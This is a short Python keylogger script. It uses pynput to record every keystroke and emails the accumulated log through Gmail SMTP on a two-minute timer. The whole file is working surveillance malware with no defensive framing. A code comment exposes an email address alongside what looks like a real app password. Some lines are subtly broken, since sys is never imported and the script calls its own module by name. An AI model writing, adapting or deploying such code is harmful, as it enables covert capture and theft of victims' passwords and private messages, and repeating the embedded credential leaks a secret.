import pynput, threading, smtplib


class Logger:
    
    
    def __init__(self,sendInterval,email,passwd):

        self.timer = sendInterval
        self.log = 'keylogger capture:\n\n'
        self.email = email
        self.passwd = passwd
    
    
    def appendLog(self,string):
        self.log = self.log + string
    
    
    def processKey(self,key):
        try:
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currentKey = ' '
            else:
                currentKey = (' ' + str(key) + ' ')
        self.appendLog(currentKey)

    
    def sendMail(self,email,password,message):
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    
    
    def report(self):
        self.sendMail(self.email, self.passwd, "\n\n" + self.log)
        self.log = ''
        timer = threading.Timer(self.timer,self.report)
        timer.start()
    
    
    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.processKey)
        with keyboard:
            self.report()
            keyboard.join()
#can also: 
#import keyLog
#logger = keyLog.Logger(120,'benpro4433@gmail.com','pismjflzgewqigwx') on another script

logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS')
try:
    logger.start()
except KeyboardInterrupt:
    print('\nInterrupt caught, quitting...')
    sys.exit()